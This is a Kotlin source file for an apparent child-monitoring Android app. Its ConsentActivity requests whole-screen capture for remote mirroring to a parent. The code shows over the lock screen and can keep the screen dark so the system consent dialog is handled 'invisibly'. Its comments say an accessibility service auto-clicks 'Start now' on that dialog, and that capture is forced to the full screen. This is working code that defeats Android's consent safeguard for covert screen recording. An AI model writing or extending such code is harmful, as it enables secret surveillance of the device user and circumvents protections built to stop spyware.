package com.familyguard.child.ui

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.SystemClock
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import com.familyguard.child.data.Store
import com.familyguard.child.service.MirrorManager
import com.familyguard.child.service.MirrorService
import com.familyguard.child.util.AgeRelease

class ConsentActivity : ComponentActivity() {

    private val projLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { res ->
        if (res.resultCode == RESULT_OK && res.data != null) {
            val i = Intent(this, MirrorService::class.java)
            i.putExtra("resultCode", res.resultCode)
            i.putExtra("data", res.data)
            ContextCompat.startForegroundService(this, i)
        } else {
            // Dialog CANCEL/deny hua — in-flight consent state clear karo, warna
            // smart suppression 60 s tak naya request rok degi aur mirror "dead"
            // lagega jab tak parent dobara start na dabaye.
            Store.projectionRequestedAt = 0L
            Store.lastConsentRequestAt = 0L
        }
        finish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Show even over the lock screen so a reboot + remote mirror request never
        // needs the child to unlock the phone. quiet=true (boot re-establish) keeps
        // the screen OFF — the dialog is handled invisibly while the phone stays dark.
        val quiet = intent?.getBooleanExtra("quiet", false) ?: false
        if (Build.VERSION.SDK_INT >= 27) {
            runCatching {
                setShowWhenLocked(true)
                if (!quiet) setTurnScreenOn(true)
            }
        }
        if (!Store.paired || Store.released || MirrorManager.hasProjection) {
            finish()
            return
        }
        // Double-launch guard: do mirror_start commands ke beech ConsentActivity
        // do baar khul kar do consent dialog stack kar sakta hai (OEM par
        // background launch ka race). 3 s ke andar doosri instance kuch nahi karti.
        val now = SystemClock.elapsedRealtime()
        if (savedInstanceState == null && now - Store.lastConsentRequestAt < 3_000L && Store.projectionRequestedAt > 0L) {
            finish()
            return
        }
        // Arm the accessibility auto-confirm: EnforcementService will click
        // "Start now" on the system dialog within this window.
        Store.lastConsentRequestAt = now
        Store.projectionRequestedAt = now
        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
        runCatching {
            // Android 14+ dialog me "A single app" dropdown default hota tha —
            // uske saath Start dabane par sirf HUMARI app capture hoti thi aur
            // parent ko kaali screen dikhti thi ("start karne pe bhi chal ni
            // raha"). createConfigForDefaultDisplay() dropdown ko hata deta hai:
            // dialog seedha POORE screen ki consent deta hai, auto-click hamesha
            // sahi cheez capture karta hai.
            val req = if (Build.VERSION.SDK_INT >= 34) {
                mgr.createScreenCaptureIntent(
                    android.media.projection.MediaProjectionConfig.createConfigForDefaultDisplay()
                )
            } else {
                mgr.createScreenCaptureIntent()
            }
            projLauncher.launch(req)
        }.onFailure { finish() }
    }
}
